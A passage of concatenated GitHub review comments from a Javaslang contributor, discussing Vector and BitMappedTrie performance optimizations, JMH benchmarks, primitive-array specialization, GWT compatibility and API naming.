1_000_000).take(10).delegate.size()).isLessThanOrEqualTo(2 * 10);\n}\n. It would still consume O(n) memory, just as\njava\nList.range(0, 1_000_000).take(550_000).toJavaList()\nwill have 800_000 elements internally, instead of 500_000, it's the same concept, just a different multiplier (1.5 instead of 2).\n. We could move the tests to a separate package to see these problems.\nI tried, but HashArrayMappedTrie, RedBlackTree, Comparator is not public and used in tests.\nAlso, the following methods are not public:\n- CharSeq.unfold*, CharSer.(CharFunction|CharUnaryOperator)\n- Lazy.narrow\n- PriorityQueue.(collector|tabulate|fill)\n- Array.unfold*\n- Vector.unfold*\n- CharSeq.indexOfOption\n- Queue.unfold*\n- LinkedHashSet#ofAll(java.util.stream.Stream<? extends T>)\n- Try.NonFatalException#of\nand shouldMatchCustomTypeWithUnapplyMethod and a few more from APITest aren't working.\nI will commit the production code changes, without moving all the tests (let's do that when no PRs are pending).\n. > when performing package-private test scenarios\nWe don't have many of those (nor should we do that often).\n. Not sure if I got it right, but instanceOf might be an alternative: \nhttps://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Operators/instanceof\n. Updated this PR with a more thorough refactoring and unification.\nSeparated everything in cohesive commits.\nAttached all the results to the commit messages also.\n@danieldietrich, @ruslansennov, @eduardmanas, please review :)!\n. Thanks, would like this to be merged soon :).\nThe camel cases would make them more confusing, they seem non-final but aren't changed in the generated code, which is actually run, so they're effectively constants.\n. > So yes, it should be made public\nThanks :)\n\nMaybe the public would be needed also for interfaces like List then\n\nInterface methods can only be public, no need to specify it explicitly.\n. Done, please recheck!\n. What should happen for Tuple3-8?\nrotateRight? rotateLeft?\n. I think Array is already laid out correctly ...\n. I don't know, @ruslansennov?\n. > we plan to make Javaslang GWT-compatible\nwould something like this help? https://github.com/WeTheInternet/xapi/tree/master/gwt/gwt-reflect\n\nOn other side, reflection is very slow\n\nIt can be slow, I agree, but often it's jitted and has the exact same speed (and assembly). Let's profile it.\n\nit is unclear that we will have some benefit from using this library\n\nHence my question, it's unclear to me too :)\n. Sure, it was rather a question :)\n. @danieldietrich: https://www.youtube.com/watch?v=Tc9vs_HFHVo :)\n. This was highlighted in the commit message you both reviewed: assertions are checked for JMH benchmarks, no performance is measured, just correctness. \n. It's only ~3 minutes overhead (will be less after an optimization I created yesterday).\nPlease don't revert this too... \n. Let's not execute the rest of the tests either, we will have even faster builds... \n. I've found several bugs after I introduced the assertions (mentioned in the code review also). \nBenchmarks aren't tests (they don't validate behavior automatically), they do need tests. \n. > this test should be part of the Javaslang unit tests\nAgain, I'm testing with the asserts whether I'm bechmarking what I think I am (e.g. cons in Clojure Vector adds to the front (as in List), or to the end? Am I accidentally comparing a prepend to an append?). It would be naive to think this is any different from why we're testing production code -- i.e. for documentation purposes and to make everything modifiable.\nIf we don't run all tests for every build, they are useless.\nIf @ruslansennov feels that 3 extra minutes are unacceptable, I won't block him from separating it into another Travis job that is run in parallel with the unit tests.\n. > should not be run on Travis service because it is completely useless\nPlease read my comments, that's why I'm writing them...\n\non my home computer it runs 4:17 min\n\nI will push a commit shortly that speeds things up - by caching the base setup and by removing pcollections and fjava results, since they're always slower (often by orders of magnitude).\n. Fixed in: https://github.com/javaslang/javaslang/pull/1414, please review.\n. > Actually now benchmarks does nothing\nCurrently the benchmarks run during the normal build phase, checking their consistency (and displaying memory usage info), i.e. a test phase for the correctness of the benchmarks, not for their speed.\n\nI would like to return a special profile\n\nLet me see what I can do :)\n@danieldietrich, congrats for the new profile picture, now I can finally identify you if you walk past me on the street ;)\n. could we disable it for that one module? Maybe put the benchmark assertions to a different build on a different Travis?. hmm, didn't we update that?\n(note: if you update the description, feel free to update the JMH version also to 1.17). > Please take the following serious - take a walk, breath fresh air and widen your sight again. The benchmarks are already awesome, also the naming is great. These benchmarks are now ready to be taken to the next level... an article!\nNot sure how to interpret this exactly, but will definitely think about an article (some guidelines would help, i.e. what would people find interesting?), after the Vector rewrite is finished :)\n. @danieldietrich, @ruslansennov, @eduardmanas, @zsolt-donca, opinions?\n. Thanks, we should finish the task and apply it to the whole codebase consistently, as currently the long indices are just cast to ints (lose-lose situation).\n. We could generate all the variants, but I agree, it's not really worth the effort.\nYou could probably create the helpers @danieldietrich recommended (it's what I did with the Java 8 map also, to allow (k, v) -> like lambdas, Groovy style.\nAbout the inlining, I'm not sure, we could check it out by writing a simple JMH benchmark and running it with \"-XX:+UnlockDiagnosticVMOptions\", \"-XX:+PrintInlining\" to see whether it's inlined or not.\n. Not really, but we could use pattern matching somewhere - or here, if it fits.\n. > I'll make a try at combining the solutions.\nPlease leave comments on how I should change this instead :)\n. @danieldietrich, opinions? :)\n. will rather update my PR :)\n. Which of the two pattern matches do you guys like more:\njava\nreturn Match(num).of( /*@formatter:off*/\n        Case(n -> n >= 1000,                                n -> length(n / 1000) + length(1000) + letterCount(n % 1000)),\n        Case(allOf((Integer n) -> n >= 100, n -> n % 100 > 0), n -> length(n / 100) + length(100) + CONJUNCTION.length() + letterCount(n % 100)),\n        Case(n -> n >= 100,                                 n -> length(n / 100) + length(100)),\n        Case(n -> n >= 20,                                  n -> length(n / 10 * 10) + letterCount(n % 10)),\n        Case(0,                                             0),\n        Case($(),                                           n -> length(n))\n); /*@formatter:on*/\nor\njava\nreturn Match(num).of( /*@formatter:off*/\n        Case(n -> n >= 1000, n -> length(n / 1000) + length(1000) + letterCount(n % 1000)),\n        Case(n -> n >= 100,  n -> Match(n).of(\n                                   Case(n1 -> n1 % 100 > 0, n1 -> length(n1 / 100) + length(100) + CONJUNCTION.length() + letterCount(n1 % 100)),\n                                   Case($(),                length(n / 100) + length(100)))),\n        Case(n -> n >= 20,   n -> length(n / 10 * 10) + letterCount(n % 10)),\n        Case(0,              0),\n        Case($(),            n -> length(n))\n); /*@formatter:on*/\ni.e. in the second example there's a pattern match inside another pattern match, in order to check whether it both greater than 100 and divisible, without duplicating any of the conditions.\nAlso, thanks to the @formatters both pattern matches will keep this alignment.\n@jorander, @danieldietrich, opinions :)?\n. > is indirectly determined by the parent \nI consider that a feature, two separate cases refer to the same parent state, i.e. when n >= 100.\nOtherwise we have to copy paste, which isn't DRY :/\n. Indeed, that's why I experimented with them :)\n. Pushed, @jorander, are you okay with this version? :)\n. I like the idea of static importing, but not sure an Aliases would be the place to do it: it would have a very low cohesion.\n. If we don't want to include all variants for all primitives and wrappers and iterables etc, it might work :)\n. :+1: (btw, the tree should be updated with BitSet and PriorityQueue)\n. oh boy, I really love breaking changes :D\n. @mping, yes, some tweaking was necessary, otherwise the results would have been misleading.\nI hope you don't mind.\n. Hello @ashrko619, @danieldietrich :)\nSure, the simplest would probably be to pull the project from upstream and soft rebase it on head, making all the changes merged and not committed and can me committed in a single swoop :)\nThis can also be done from Idea by making it up-to-date first: VCS -> git -> Rebase my GitHub fork, solving the conflicts (it seems there aren't any) if there are any and from the Version Controls Log view do a right click and reset/soft to upstream/master and commit the modified files again :)\nHope that helps :)\n. @danieldietrich, @zsolt-donca, @eduardmanas, @ovidiudeac, @djspiewak, please review :)\n. @danieldietrich, would it help if I explained the whole commit via a hangouts session?\nI think the code is significantly simpler than my first few attempts and not over-optimized with questionable gains, like I consider the https://github.com/paplorinc/scala/blob/2.12.x/src/library/scala/collection/immutable/Vector.scala#L273 implementation (I urge you to check it out).\nI removed very many premature optimizations, kept only those that have a serious performance or memory impact.\n\nThey seem to make sense only the first BRANCHING_FACTOR (= 32) times using drop and tail.\n\nThe trailing and leading play a very important role in append and prepend also (they don't depend on the depth of the tree this way, making a lot fewer copies), they make the head actually constant, not just effectively, they save drop and dropRight (therefore slice, tail, init etc.) from making unnecessary copies, saving memory etc.\nIf you have doubts about their usefulness, I really urge you to remove it temporarily and rerun the benchmarks - I would be the happiest if we can have comparable speeds with simpler codebase!\n\nIn Javaslang we need a working version with main focus on simplicity\n\nIt may surprise you, but I fully agree. I think my implementation is among the simplest Vector implementations (though compared to Clojure it supports for prepend and slice also). Feel free to compare it against a Java impl: https://github.com/andrewoma/dexx/blob/master/collection/src/main/java/com/github/andrewoma/dexx/collection/Vector.java#L481\nIf you have concrete suggestions in the code (where a lot simpler code has comparable performance), please let me know!\nWould it help if I extracted parts in separate methods/classes?\n\nI asked Ruslan this morning to implement a more minimal Bit Mapped Trie for comparison.\n\nI worked a lot on achieving this balance between simplicity and performance,  I would rather urge @ruslansennov to review this codebase instead and suggest simplifications.\n\nI see that you have the main vision to get the very most out of the performance. \n\nAgain, I understand that it may seem that way, but I accepted many drawback (e.g. get is sometimes a lot slower than Scala), for the sake of simplicity and readable code. If you think I failed in that regard, please let me know how I can fix it.\nPlease also keep in mind that this is a very complicated algorithm (not unlike PriorityQueue or HashArrayMappedTrie).\n. Thanks @zsolt-donca, I would gladly split the PR in many smaller PRs (currently did the same thing via commits, as I can't wait for PRs to be merged first).\n@danieldietrich, @ruslansennov, please let me know how it would make your work simpler.\n. Will check it out next week (I'm very busy, sorry), until then, please simplify everything as much as possible.\nIf you're testing the speed of for loops, don't include everything else in it.\nJust iterate over the array and either consume it via the blackhole, or rather collect it via a cheap operation like xor so that we can have some assertions that fail if we mess it up (like they failed until now when you made an error, that's exactly why we need them :)\n. I would be surprised if the simple for loop (which is often optimized by JIT anyway) wouldn't be at least 10x faster ... maybe even 100x.\nHowever, you should get the same results with or without the xor (actually any constant size operation would only bring the values closer together).\nPlease try to debug it manually, I would do the same :).\n. Try it out and report your findings :)\n. Sure, a blog post would be nice, but a lot of things are very hard to interpret here currently, I really urge you to understand JMH well first, it's a lot more difficult than it seems - and as I tried to point out in these benchmarks, they are still far from being finished.\n. It seems like a Java compiler bug again\n. http://bugs.java.com/bugdatabase/view_bug.do?bug_id=JDK-8164080\n. @danieldietrich, @ruslansennov, I'm working on making Vector a lot more memory efficient, bare with me :)\n. > Let's [...] make Vector the best immutable Vector available on the JVM :-)\nThat's what I'm working on, could you please review it :)?\n. > Don't just look at the O(x) complexity.\nI looked at the JMH tests, which showed that it's usually faster. Even for small arrays.\n\nSome operations are expected to be linear in time.\n\nWhy, if we can do better?\n\nThe memory footprint matters.\n\nI managed to store primitives in Vector, so now the memory footprint is basically the same:\nfor 1000 elements\n`java.lang.String` uses `2 KB` (`24 bytes` overhead, `0.0` bytes overhead per element)\n`javaslang.collection.CharSeq` uses `2.7 KB` (`712 bytes` overhead, `0.7` bytes overhead per element)\nWe could optimize it further by storing bytes instead of chars for ASCII Stings.\n@danieldietrich, not sure I understand why you aren't more excited about this, we can get better performance, for less memory, with a lot less complicated codebase.\n. @danieldietrich, @ruslansennov, @zsolt-donca\n\nTypical String operations are substring, replaceAll\n1. If we have some concrete usage statistics, we should incorporate them into the JMH tests. \n   If we don't, we shouldn't invent it.\n2. If really these two are typical, why do we even have a wrapper around String?\nOur benchmarks run in theoretically infinite memory without garbage collection\n\nWe run GC between benchmarks - but then again, this impl can produce less garbage than String, not more (i.e. structural sharing, which is not enabled by default in String (i.e. \n-XX:+UseG1GC and -XX:+UseStringDeduplication)).\n\nI know that collecting the garbage of many Vector operations will be definitely more cost intensive than freeing mem of Strings.\n\nGC traces live objects, not dead ones (it iterates through the GC roots).\nAlso, String literals are stored in the Constant Pool, they're not evicted by GC (String Objects can be, since Java 6, I think).\nInstead of Luke, trust your feelings, my motto is Measure, don't guess!\ni.e. memory storage with bytes for ASCII content would yield:\n`` java\nfor 10000 elementsjava.lang.Stringuses19.6 KB(24 bytesoverhead,0.0bytes overhead per element)javaslang.collection.Vectoruses16.2 KB(6.4 KBoverhead,0.7` bytes overhead per element)\nfor 1000 elements\njava.lang.String uses 2 KB (24 bytes overhead, 0.0 bytes overhead per element)\njavaslang.collection.Vector uses 1.7 KB (720 bytes overhead, 0.7 bytes overhead per element)\n```\ni.e. 80% of the original memory usage (for very small Strings it may be slightly bigger).\nAnd the measurements for replace and substring:\njava\nOperation  Ratio                               10    100   1000   10000\nReplace    slang_persistent/java_persistent 0.57\u00d7  0.55\u00d7  1.44\u00d7   1.39\u00d7\nSlice      slang_persistent/java_mutable    0.49\u00d7  0.58\u00d7  3.99\u00d7  34.95\u00d7\ni.e. for very small Strings it's about 50% slower, for bigger ones it's a lot faster.\nConclusion: this implementation scales a lot better than the previous implementation!\n. @ruslansennov, not sure what's funny, or what your numbers mean (another measurement or just the min/max from what you quoted?).\nIf you have suggestions, I would appreciate them, if you're only here to mock, at least let me know what you're mocking so that I can improve it.\n\nAlso I believe there is no sense in benchmarks with < 1000 elements\n\nYou may be right, that's why I provided bigger values also.\n. > My suggestion is to stay CharSeq as is, without changes.\n@ruslansennov, @danieldietrich, could you please provide some measurable goals as to why you both would like to keep a more complicated codebase (most CharSeq methods are delegated now), using possibly more memory and with slower asymptotic speed?\nIt seems to me the decision was made before we investigated anything, and even when I provide \nmeasurable results, they're ignored for some reason I don't yet understand. \n. StringBuilder#toString is linear also...\n. > It could be even CharSeq.Builder which is instantiated with CharSeq.builder()\nIn my opinion, every persistent datastructure is a builder to itself.\nBesides the obvious solution of making a separate builder class, I think this implementation could become a builder and have an O(1) toString at the same time.\nPeople could modify it at will (having a builder state) and when done, just call the toString method on it (realized state).\nThis could be achieved by having two impls (one storing a String, the other a Vector), or by simply memoizing the toString method.\n. FYI: https://www.youtube.com/watch?v=_evzaAkd594\nI think it's worth checking out whether we can (or should) bring these Java 9 features to Java 8 CharsSeq via thenew  primitivizable Vector impl\n. I would ban null values everywhere, muhahahaha :trollface:\nBut if that's not possible, we should at least do something more meaningful than an NPE :/\n. related to https://github.com/javaslang/javaslang/pull/1449\n. @danieldietrich, @zsolt-donca, @eduardmanas, @ruslansennov, @gpanther, opinions?\n. @danieldietrich, it seems I managed to work around the problem that specialization can have, i.e. I don't have to repeat any algoriths, it's contained in general getter/setter/newInstance/getLength methods, as seen in the code (no need for specialized subclasses).\nAlso, not everybody can wait another 4 years for automatic specialization to appear, especially that this POC proved to be a viable alternative :).\nWill try to apply it to the whole Vector impl to see what benefits/drawbacks it has.\nPlease bare with me :).\n. My first full primitivization attempt for Vector: https://github.com/javaslang/javaslang/pull/1449/commits/212242a62e03fac4d81d22cded1e55601964f4b6#diff-5f4a536088f7f19a51ebbef20cf7b3ef\nThe code looks basically the same, the only significant change in the algorithm is the way we access the array, i.e. instead of a[b] = c we have setAt(a, b, c).\nWill investigate the reason why append and prepend are slower now, but otherwise the primitive internals are a lot faster for many methods (e.g. create and iterate are 3-5x faster, using 4x less total memory) :)\n@danieldietrich, @ruslansennov, opinions :)?\n. Welcome back :)\n. Does the primitive-enabled Vector change the picture (i.e. same memory footprint, with constant add, instead of linear one)?\n. Good job @valery1707!\nI also vote for no abbreviations, they always seem like a good idea at the time and always turn out to be a bad investment. I usually search for shorter synonyms, when the names get too long.\nEdit: I do find domain specific abbreviations acceptable, like fun/func for functions, as they increase call-site signal-to-noise ratio :)\nWhat I currently miss from the syntax is ranges, for which I guess the ones from Iterator should be used (every other class just uses those anyway, and we definitely need laziness there by default).\nopinions, @danieldietrich?\n. @valery1707, would it be possible for you to fix mistakes in the same commit there were made?\nPull requests are meant to fix all mistakes that were found, without confusing the future generation with confusing commit histories. Also, new reviewers shouldn't go over redundant commits that modify the same line multiple times.\nYou can edit previous commits by doing an interactive rebase (in Idea there's a GUI for that - VCS / Git) and force push the result.\nIn the end, the commits should be divided logically, not historically (i.e. added checked function aliases, added collection static factories etc :)\n. > After this PR will good for everyone, I can create new PR with splitted commits for different part\nIn git you can modify the history, and PRs are meant for that (i.e. it's ok to force push BEFORE it's merged).\nYou can force push (http://stackoverflow.com/questions/5509543/how-do-i-properly-force-a-git-push), in order for the commit history to make sense: otherwise it just represents your mistakes, not a logical order of steps.\n. > There is one thing that still bothers me - we will have mixed upper case and lower case factory methods, e.g.\nCould you please explain the need for upper-camel? If it's simply to model Scala's companion constructor, we could simply translate that to statically-importable lowercase static factories, e.g. option, some, checkedFunction.\nAbout API, well, it could have a prefix of e.g. $ or _, but still lowercase, e.g. $option.\n. @valery1707, wow, really nice job, congrats!\nNeat, organized commits, nice generator, tests ... can't wait to start using it! :)\nOnce all is accepted, it would be nice to apply these to Javaslang itself (including tests), to serve as documentation! :)\n. @danieldietrich, I agree with @valery1707, I don't like the unsafe version either (e.g.\n HashMap<Integer> = Map('a');), but now that we have compact tuples, it could be:\njava\nMap(\n  Tuple(1, \"a\"),\n  Tuple(2, \"b\"),\n  Tuple(3, \"c\")\n);\nor maybe we should think about making Tuple construction special (as in Scala) and create a method called _ or $ or T in the API instead, making it typesafe, number-of-arguments-safe like:\njava\nMap(\n  T(1, \"a\"),\n  T(2, \"b\"),\n  T(3, \"c\")\n);\n. @valery1707, awesome job, please update the description if you consider it done now :)!\n. would it complicate the review for you this way?\nI would prefer putting it in a separate PR for clarity :)\n. Sure, should I do them in this PR, in separate commits, or in another PR?\n(I would prefer merging these changes first, as they're not strictly related to the new Vector)\n. > In ideal it will be two changed classes: new class BitMappedTrie.java and modified (with just replaced HAMT to BMT) Vector.java. Nothing complicated :)\nIn HAMT you can put negative indices and add an offset to it later. In BMT you need to shift the whole tree by a full half tree (i.e. add another parent and pretend the whole new left side is filled with elements) and store the count in an offset, so that only the actual nodes are accessed later.\nIt's not a problem, but I do consider it a lot more complicated than a search and replace :).\n. It can, it's just not as trivial as for a HAMT.\nI thought a lot about how to make prepend constant time (Clojure simply skipped it).\n. @ruslansennov, @danieldietrich, pushed a new version and following Ruslan's advice, I made the simplest BMT I could :).\nWill push that once this is merged and once the benchmarks are run, so that we can compare them against the optimized one.\n. @ruslansennov, force pushed a new version\n. Thank you @ruslansennov and @danieldietrich, applied the rest of the comments via force push.\n. Force pushed a new version.\nThanks to @danieldietrich, I managed to have a single depth modification method, extended with some lambdas. This way most methods are unified now!\nWe don't need to go down the tree and back again (saves time), but the lambdas slow it down a bit, so the end performance is basically the same as before (updated it in the description, though).\nNow the non-optimized BMT is only 150 lines :).\n@danieldietrich, @ruslansennov, @zsolt-donca, waiting eagerly for your reviews :)\n. Pushed a fixed version.\nI think we should wait for @zsolt-donca's review first (or even @ruslansennov's), I don't mind.\n. yeah, I posted it to the wrong place and deleted it :p\nI renamed BMT.emptyTree() to BMT.empty() (https://github.com/javaslang/javaslang/pull/1504/commits/98b6f26ce0c368e792b1d4dc6812bae77116d68c#diff-fc685519cd17ce4aee692e5275289289R24)\n. @eduardmanas, I would be interested in your opinion also, you've had valuable suggestions before :)\n. Pushed a new version with the applied recommendations. Keep them coming :)\n. > I think we could save CPU + Mem by calling trie.append directly:\nYou're basing these optimizations on the unoptimized version.\nIn the new optimized version ofAll is ~90x faster (I'm working on that PR in parallel), so this method would become a lot slower if I changed it to append directly.\nI suggest doing the optimizations later, when we can measure something concrete :).\nEdit: \n\nIt can't know that Vector is immutable and the value never changes...\n\nActually, when optimizing, the JMS has a few assumptions (e.g. only these 2 switch statements seem to be used, so it will throw out the rest), as long as this assumption can be corrected at a small cost, when violated. Therefore it can inline length (but even if it doesn't, storing it wouldn't likely provide any measurable gain, but would complicate the code slightly).\nIt's different though for iterator, when an internal class refers to the outer one, there extracting the length makes sense (but again, it has to be measured on a case-by-case basis, unfortunately, I've had too many surprises)\n. @danieldietrich, @ruslansennov, @zsolt-donca, @eduardmanas, did I answer or apply all your requests?\nCan we merge it :)?\n. Pushed, could we please merge this and move on the the optimizations?\n. > ok, thank you, pulling it in now\nPlease review https://github.com/javaslang/javaslang/pull/1522 also.\n. > Just to get sure - did you export it like described in .ide/README.md?\nYes, but feel free to check out either the screenshots containing the diffs, or locally the two jars.\n\nDo the 'File and code templates' on your machine contain the Javaslang file header (ascii art)?\n\nyes, attached a screenshot for that also (i.e. imported the settings and created a new file)\n. Done: https://github.com/javaslang/javaslang/pull/1520\n. @danieldietrich, @ruslansennov, @zsolt-donca, @eduardmanas these are the optimizations for Vector, please dig in :)\n. > Java mutable, are you drunk?\nThis would be a case where ArrayDeque would shine :)\nMaybe I should compare against it instead :/\n. > Why Get and Append are relatively slower than in Scala?\nNot sure yet, but I'm planning on investigating it\nEdit: oh boy...\n\nEdit2: pushed the speed fix for append\n. @danieldietrich, @ruslansennov, @zsolt-donca, @eduardmanas, these are the optimizations for the new Vector.\nPlease review it commit-by-commit and take a look at the commit messages to see how much faster it got.\nAdded map to the optimizations also, now it's somehow 3x faster than ArrayList#stream ;)\n. Pushed new version.\nOptimized filter also (as I think map and filter are used most often), it's ~2x faster than Java now (finally some values that are better than Java).\n@ruslansennov, I might have found what you meant by double copying, simplified the grouping algorithm to avoid it, thanks!\n@danieldietrich, the MutableWrapper is only visible from Vector now :).\n. The branching base is selected to be 5 (i.e. 2\u2075 = 32), as it seems to be the best compromise between read and write operations:\njava\nOperation                         Ratio  base=2  base=3  base=4  base=5  base=6  base=7\nGet       java_mutable/slang_persistent   8.84\u00d7   5.36\u00d7   4.23\u00d7   3.40\u00d7   3.39\u00d7   3.32\u00d7\nUpdate    java_mutable/slang_persistent  82.37\u00d7  57.74\u00d7  53.07\u00d7  44.47\u00d7  49.36\u00d7  77.90\u00d7\nIterate   java_mutable/slang_persistent   8.01\u00d7   7.06\u00d7   3.05\u00d7   2.74\u00d7   2.83\u00d7   2.38\u00d7\n(it's surprising that update is this slow compared to the mutable counterpart, not sure we can change that, though. However, updating the whole collection (i.e. map) results in a lot better performance than Java, via streams ... I guess it depends on the usecase)\n. There's no difference in this regard.\n. I installed a new linux which will give me proper disassembly (http://psy-lob-saw.blogspot.ro/2015/07/jmh-perfasm.html), which will probably say that this way the copied array is not nulled out for some reason (i.e. if it sees array.length being used, it might conclude that the whole array is overridden) ... dunno yet, it's just a hunch\n. Rebased, will apply the rest of the comments shortly :)\nKeep them coming!\n. Thanks for the comments @danieldietrich, let's see how it affects the codebase and the benchmarks of prepend and append.\n. Sure, is @zsolt-donca also interested?\n. @danieldietrich, @zsolt-donca I pushed a new version with the applied recommendations.\nThe code is A LOT more readable now, simplified every optimization as much as I could, though that meant that map is 2x slower (still faster than java/scala), prepend is almost 10x slower (6x slower than Scala) and append is ~5x slower than before.\nWe could apply those optimizations at a later stage, if needed.\nSome methods have become slightly faster also, e.g. get, update and iterate.\nEdit: we could optimize prependAll and appendAll instead...\n. @ruslansennov, the build seems to be failing because of GWT incompatibility (https://travis-ci.org/javaslang/javaslang/builds/169480221), could you please help (I presume I need some annotations somewhere)\n. Ok, but how do I find out which method is causing the problem (I can't run the GWT tests locally)?\n. @ruslansennov, it seems to be a GWT bug, i.e. apparently method references don't convert arrays to varargs: https://github.com/javaslang/javaslang/pull/1522/commits/5102b4d8268b443f1bc37b8b226c67088e77d1ae\n. > When to use Queue, when to use Vector?\nI think the usecase would be exactly the same as when choosing between ArrayList or ArrayDeque in Java.\n. Once all Vector related PRs are done, I will extend the existing benchmarks with the things I learned from optimizing Vector also, and I can finally write that article abut optimizing Javaslang performance :)\n. ... wow, I forgot what a piece of crap Maven is (and how bad the documentation is) ... After Gradle it's like going back to SVN (though Gradle has its faults also).\nAfter 3 hours I still can't make it work, I need some Maven expert (I just understood why it's called maven ... you have to be an expert (i.e. maven) to achieve the simplest things in it...)\nSee: #1560\n. If you think simplicity is more important than freedom of choice, than we should indeed remove Array.\nBut let's be braver than that and let's define criteria for why we're keeping the rest of the data structures, and if we have similar alternatives, let's consider them.\nAs you know I have a few suggestions to investigate. Again, I'm not saying we should throw out anything, just investigate and let the numbers speak for themselves (I recommended a few in other places, I'm repeating them here as I think the situation is slightly different. If not, just ignore them):\n- Do we need Stack and Queue abstractions, if we don't want to provide alternatives?\n- Are we certain the banker's queue is the best queue implementation? We should measure it against e.g. Vector or other impls that don't have linear operations (i.e. the 'amortized' reverse)\n- We're reimplementing all the operations for String in CharSeq. Could we abstract those so that CharSeq is indeed just a rich String, without all that logic? Maybe add a primitivized Vector<Character> as an immutable StringBuilder, where most of the logic is already available?\n- Could we use Vector in BitSet also, to make update non-linear there too?\n- Are Iterator and Stream really that different? Couldn't we unify them somehow? Maybe include Option too as a one-element Stream?\n- Maybe discuss divirging from Scala where it makes sense, e.g. first instead of head, rest instead of tail, loop instead of forEach, collect instead of map, bind instead of flatMap, findAll instead of filter, bundle instead of zip, subSeq instead of slice, asString instead of mkString  etc. (other languages and frameworks dared to innovate (Groovy, Dexx, Eclipse collections), maybe we should too, where it makes sense, of course ...).\n- Maybe rename List to Stack (people are used to Lists having random access)\n- Maybe rename Vector to Seq (there's already a Vector in Java that has a bad connotation)\nMaybe all of these would only make sense in a new language/library only.\n@danieldietrich, @ruslansennov, @zsolt-donca?\n. How will this affect the toJavaArray and toArray methods from Value?\nShould we rename the former to the latter after the removal, to comply with java.util.Collections?\n. Hmm, I though this was opened for gathering information in order to reach consenus.\nYou said we should wait for the final benchmarks, I still suggest we do that, or:\n- Vector access is ~4x slower, but is a lot faster in everything else. Is it worth the extra class?\n- If people want a basically immutable, fast acces data structure, they can use any collection as a builder and call .toJavaArray() at the end (it's how people would be using Array anyway).\nI also recommended a few wild ideas above.\nI know most are out of reach, but it might be worth talking about them.\n. FYI: http://www.scala-lang.org/news/2.12.0\n. @danieldietrich, good job so far, now go get some sleep :p\n. I'm trying to follow the changes, but I'm not sure I understand one thing: can't we make the abstractions public instead?\nIf I'm mistaken correctly the problem is that the returned value is a package-private superclass.\nBut can't we extract a public interface for the private superclass and return the interface instead?\n(also, why isn't multimap simply a Map<K, Seq<V>>>)\n. > I like the idea of generated code.\nHmmm, wasn't that your counter-argument against collection specialization?\nOr can we make the generator source a valid Java source? (i.e write once and forget that this is actually a base for other cases). Otherwise I think this would have a huge maintenance cost (non-standard way of programming, scaring many people away, providing more base for mistakes).\n. As long as the source code is not Strings, I don't mind :)\n. > I don't understand. \nI just meant that source code should be written in an IDE recognizable format.\nIn my opinion currently we have some source code in Strings that are a bit cumbersome to edit, i.e. no compiler or IDE help, only after regenerating everything can I tell if it's ok (like back in Borland C++ times).\n. Thanks for clarifying. I like the approach.\nThe alternative, of generating all cases from an annotated .java file would probably be more complex :)\n. Will do my best to make it GWT compliant also, but I might need help from @ruslansennov, as currently the GWT tests are failing and I'm not sure how to decipher the error message :/.\n. @danieldietrich, will rebase, once #1522 is merged :)\n. Pushed, but GWT complains again. I'm not sure how to fix those errors, any help?\n. > Also I removed dead code: LeafType.getAt(...) and LeafType.isPrimitive() weren't used.\nNot sure what you mean by dead code, every method is used and almost every line is tested (except for some redundant boundary checks in BMT, that were already checked in Vector):\njava\nElement         Class       Method          Line\nBitMappedTrie   100% (2/2)  100% (33/33)    97%  (152/156)\nLeafType        100% (1/1)  100% (17/17)    100% (52/52)\nVector          100% (1/1)  100% (130/130)  100% (329/329)\n- getAt usage: https://github.com/paplorinc/javaslang/blob/Primitivization/javaslang/src/main/java/javaslang/collection/BitMappedTrie.java#L178\n- isPrimitive usage: https://github.com/paplorinc/javaslang/blob/Primitivization/javaslang/src/main/java/javaslang/collection/BitMappedTrie.java#L317\n\nI moved it to VectorModule because it is currently only used by Vector.\n\nIt's actually also used by BitMappedTrie and VectorBenchmark.\nShould I really merge Vector with BitMappedTrie and LeafType (they're only meant to complement Vector)?\nIt would result in a huge, ~1900 line behemoth, that would contain multiple, separate responsibilities.\nIf you think this change is too complex, I don't mind separating it into more commits/files, but I need to know what is hard to understand. :)\nI can also add more documentation or explain it here, just let me know where the difficulty is.\n. @danieldietrich, @zsolt-donca, added comments throughout the codebase to help in reviewing.\n. > It is so highly optimized that the logic of the BMT leaks to the outside. \nI don't think it's fair to compare it against something conceptually as simple as a Future, but if you think the impl is still leaking, please advise on how to make it better, simpler!\nVector basically just delegates now, there is no BMT logic there.\n\nI did not want to fix the 'errors' of the Java language. \n\nI think this whole library's sole purpose is exactly that, to fix some of Java's shortcomings.\n\nWith Project Valhalla we probably get primitive generics. \n\nJDK 9 just got delayed again to mid 2017, version 10 probably won't be widespread enough for another ~5 years. And even when it will be, will Javalang simply deprecate Java 8 & 9 support (it probably won't be fully backwards compatible)?\nI think people need a memory efficient, fast, random access, persistent collection now.\n. @danieldietrich, pushed version with exhaustive primitive array helper generation - making it GWT compatible also, as it doesn't need reflection anymore.\n. @danieldietrich, would you like me to change anything in this commit? :)\n. > Please just nest the *ArrayType into ArrayType as discussed in the original PR.\nIs there a non-hacky way for this, I'm not proud of how this code generation part turned out :/\n. @danieldietrich, I tried, but I can't convince Scala.\nCould you please do it after merging this :)?\nIs there anything else you would like me to address?\n. @ashrko619, please rebase your PR on master :)\n(from Idea it's VCS -> Git -> Rebase my github fork)\n. The latest compiler solves many issues, but it seems others were brought to our attention, e.g.:\njava\njava.util.ConcurrentModificationException\n    at java.util.HashMap.computeIfAbsent(java.base@9-ea/HashMap.java:1138)\n    at javaslang.Function3.lambda$memoized$cc475b9f$1(Function3.java:200)\n    at javaslang.collection.euler.Euler67Test.lambda$static$8440914d$1(Euler67Test.java:52)\n    at javaslang.Function3.lambda$tupled$3fce4281$1(Function3.java:182)\n    at java.util.HashMap.computeIfAbsent(java.base@9-ea/HashMap.java:1137)\n    at javaslang.Function3.lambda$memoized$cc475b9f$1(Function3.java:200)\n    at javaslang.collection.euler.Euler67Test.lambda$static$8440914d$1(Euler67Test.java:52)\n    at javaslang.Function3.lambda$tupled$3fce4281$1(Function3.java:182)\n    at java.util.HashMap.computeIfAbsent(java.base@9-ea/HashMap.java:1137)\n    at javaslang.Function3.lambda$memoized$cc475b9f$1(Function3.java:200)\n    at javaslang.collection.euler.Euler67Test.solve(Euler67Test.java:43)\n    at javaslang.collection.euler.Euler67Test.shouldSolveProblem67(Euler67Test.java:38)\ni.e. the Function.memoize might not be thread safe :/. @danieldietrich, might be related to https://blog.jooq.org/2015/03/04/avoid-recursion-in-concurrenthashmap-computeifabsent. Everything compiles with Java 9 now, and the tests are passing with Java 8. I think we can merge it, though the above memoization bug should be fixed on 9, evenually.. Great! Have you investigated the memoization bug? Or how to make the build pass on Java 9 